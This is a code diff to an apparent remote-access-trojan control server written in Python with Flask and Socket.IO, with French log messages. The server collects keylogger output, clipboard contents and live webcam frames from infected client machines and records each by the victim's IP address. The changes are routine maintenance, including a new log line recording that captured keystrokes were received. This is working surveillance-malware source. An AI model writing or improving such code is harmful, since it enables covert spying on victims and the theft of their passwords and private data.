@@ -4,8 +4,8 @@ import logging
 import os
 import threading
 from datetime import datetime
-from queue import Queue
 from logging.handlers import RotatingFileHandler
+from queue import Queue
 
 import click
 from flask import Flask, request, send_file, Response
@@ -347,9 +347,10 @@ class GetWebcamLink(Resource):
     def get(self, client_id):
         client = Client.query.get(client_id)
         if client:
-            return {'status': 'success', 'message': f'La webcam est disponible sur le lien suivant: /webcam/{client_id}'}, 200
+            return {'status': 'success', 'message': f'/api/v1/webcam/{client_id}'}, 200
         else:
             return {'status': 'error', 'message': 'Client non trouvé.'}, 404
+
 
 @webcam_ns.route('/<int:client_id>')
 class StreamWebcam(Resource):
@@ -469,11 +470,14 @@ def handle_keyboard(data):
         new_command = Command(type=CommandType.KEYLOGGER, client_id=client.id, file_path=keylogger_path)
         if db.session.query(Command).filter_by(file_path=keylogger_path).count() > 0:
             update_command = Command.query.filter_by(file_path=keylogger_path).first()
-            update_command.date_created = datetime.now()
+            update_command.date_updated = datetime.now()
             db.session.commit()
         else:
             db.session.add(new_command)
             db.session.commit()
+
+        app.logger.info(f"Journal des touches reçu de {client.ip} et enregistré sous {keylogger_path}")
+
 
 @socketio.on('clipboard_response')
 def handle_clipboard(data):
@@ -495,6 +499,7 @@ def handle_clipboard(data):
             db.session.add(new_command)
             db.session.commit()
         app.logger.info(f"Contenu du presse-papiers reçu de {client.ip} et enregistré sous {clipboard_path}")
+
 
 @socketio.on('webcam_response')
 def handle_frame(data):
@@ -518,6 +523,7 @@ def stream_frames():
         frame_data = video_frames.get()
         yield (b'--frame\r\n'
                b'Content-Type: image/jpeg\r\n\r\n' + frame_data + b'\r\n')
+
 
 setup_logging()
 if __name__ == '__main__':
